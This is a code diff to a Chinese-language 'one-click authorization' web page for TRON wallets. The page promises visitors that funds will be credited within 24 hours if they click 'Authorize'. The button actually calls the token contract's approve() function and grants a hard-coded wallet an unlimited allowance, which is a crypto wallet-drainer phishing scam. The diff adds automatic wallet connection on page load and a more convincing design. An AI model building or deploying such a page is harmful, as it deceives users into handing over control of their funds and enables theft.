@@ -7,62 +7,56 @@
 <style>
   body {
     font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
-    background: #f5f7fa;
-    color: #333;
+    background: linear-gradient(-45deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
+    background-size: 400% 400%;
+    animation: gradientBG 12s ease infinite;
+    color: #fff;
     display: flex;
-    flex-direction: column;
     align-items: center;
     justify-content: center;
     height: 100vh;
     margin: 0;
     padding: 20px;
   }
+  @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
   .container {
-    background: white;
+    background: rgba(255, 255, 255, 0.05);
+    backdrop-filter: blur(12px);
+    border-radius: 16px;
     padding: 30px 40px;
-    border-radius: 12px;
-    box-shadow: 0 6px 12px rgba(0,0,0,0.1);
-    max-width: 400px;
+    max-width: 420px;
     width: 100%;
     text-align: center;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
   }
-  h1 {
-    font-weight: 600;
-    margin-bottom: 16px;
-    color: #2c3e50;
-  }
-  p {
-    font-size: 16px;
-    margin-bottom: 32px;
-    line-height: 1.5;
-  }
+  h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
+  p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
   button {
-    background-color: #3b82f6;
-    color: white;
-    font-size: 18px;
-    padding: 12px 0;
-    width: 100%;
-    border: none;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
+    background: linear-gradient(90deg, #2563eb, #3b82f6);
+    color: white; font-size: 18px; padding: 12px 0; width: 100%;
+    border: none; border-radius: 8px; cursor: pointer;
+    transition: all 0.3s ease;
   }
   button:hover {
-    background-color: #2563eb;
+    background: linear-gradient(90deg, #1d4ed8, #2563eb);
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(37,99,235,0.5);
   }
-  #status {
-    margin-top: 20px;
-    min-height: 24px;
-    font-size: 14px;
-    color: #555;
-  }
+  #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
+  .loading { color: #facc15; }
+  .success { color: #4ade80; }
+  .error { color: #f87171; }
 </style>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
 <div class="container">
   <h1>一鍵授權頁面</h1>
-  <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>
+  <p>點擊下方授權按鈕，區塊鏈中資金會在 24 小時內，為您進行入賬，請確認。</p>
   <button id="approveBtn">授權</button>
   <p id="status"></p>
 </div>
@@ -70,36 +64,84 @@
 <script>
   const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD TRC-20 合約地址
   const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // A 錢包地址
-  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 無限額
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
   let tronWeb;
 
-  async function checkTronWeb() {
+  async function connectWallet() {
+    // TronLink / TronWeb
     if (window.tronWeb && window.tronWeb.ready) {
       tronWeb = window.tronWeb;
-      document.getElementById("status").innerText = "錢包已連接：" + tronWeb.defaultAddress.base58;
+      return tronWeb.defaultAddress.base58;
+    }
+    // 新版 TronLink API
+    if (window.tronLink) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    // 幣安 Web3 TRON
+    if (window.binance && window.binance.tron) {
+      await window.binance.tron.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb || new TronWeb(window.binance.tron);
+      return tronWeb.defaultAddress.base58;
+    }
+    return null;
+  }
+
+  async function checkTronNetwork() {
+    try {
+      const chainId = await tronWeb.trx.getChainId?.();
+      if (chainId && chainId !== '_') { // TRON 主網 chainId 為 "_"
+        document.getElementById("status").innerText = "請切換到 TRON 主網";
+        document.getElementById("status").className = "error";
+        return false;
+      }
       return true;
-    } else {
-      document.getElementById("status").innerText = "請先安裝 TronLink / 幣安 Web3 / Trust Wallet 並連接錢包";
-      return false;
+    } catch {
+      return true;
     }
   }
 
   async function approve() {
-    if (!await checkTronWeb()) return;
+    if (!tronWeb) {
+      document.getElementById("status").innerText = "請先連接錢包";
+      document.getElementById("status").className = "error";
+      return;
+    }
 
     const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
-
     try {
       document.getElementById("status").innerText = "發送授權交易中，請簽名...";
-      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      document.getElementById("status").className = "loading";
 
-      document.getElementById("status").innerText = "授權成功，交易ID：" + tx;
+      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      document.getElementById("status").innerText = "✅ 授權成功！交易 ID：" + tx;
+      document.getElementById("status").className = "success";
     } catch (error) {
       console.error(error);
-      document.getElementById("status").innerText = "授權失敗或用戶取消";
+      document.getElementById("status").innerText = "❌ 授權失敗或用戶取消";
+      document.getElementById("status").className = "error";
     }
   }
+
+  // 頁面載入時自動檢測並連接錢包
+  window.addEventListener('load', async () => {
+    document.getElementById("status").innerText = "正在檢測錢包...";
+    document.getElementById("status").className = "loading";
+
+    const address = await connectWallet();
+    if (!address) {
+      document.getElementById("status").innerText = "未檢測到 TRON 錢包，請使用 TronLink 或幣安 Web3";
+      document.getElementById("status").className = "error";
+      return;
+    }
+
+    if (!await checkTronNetwork()) return;
+
+    document.getElementById("status").innerText = "錢包已連接：" + address;
+    document.getElementById("status").className = "success";
+  });
 
   document.getElementById("approveBtn").onclick = approve;
 </script>
